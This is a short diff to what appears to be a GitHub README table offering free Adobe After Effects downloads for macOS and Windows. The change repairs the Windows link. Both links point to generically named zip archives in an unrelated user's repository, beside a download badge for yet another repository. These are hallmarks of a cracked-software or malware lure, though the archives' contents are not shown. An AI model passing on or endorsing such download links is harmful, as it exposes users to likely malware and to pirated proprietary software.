@@ -6,4 +6,4 @@
 
 | Downloads | For MacOS | For Windows |
 |:-------------:| :-----:| :--------:|
-| ![Downloads](https://img.shields.io/github/downloads/cydolo/CyberReverse/total?color=darkcyan&label=Downloads&style=flat-square) | [Download For MacOS](https://github.com/a7med-hussien/Adobe-After-Effects-for-MacOS-and-Windows-64-32/releases/download/22.3.0/Soft.Install.v1.4.zip) | [Download For Windows] | (https://github.com/a7med-hussien/Adobe-After-Effects-for-MacOS-and-Windows-64-32/releases/download/22.3.0/ExtraModes_v1.6.zip) |
+| ![Downloads](https://img.shields.io/github/downloads/cydolo/CyberReverse/total?color=darkcyan&label=Downloads&style=flat-square) | [Download For MacOS](https://github.com/a7med-hussien/Adobe-After-Effects-for-MacOS-and-Windows-64-32/releases/download/22.3.0/Soft.Install.v1.4.zip) | [Download For Windows](https://github.com/a7med-hussien/Adobe-After-Effects-for-MacOS-and-Windows-64-32/releases/download/22.3.0/ExtraModes_v1.6.zip) |
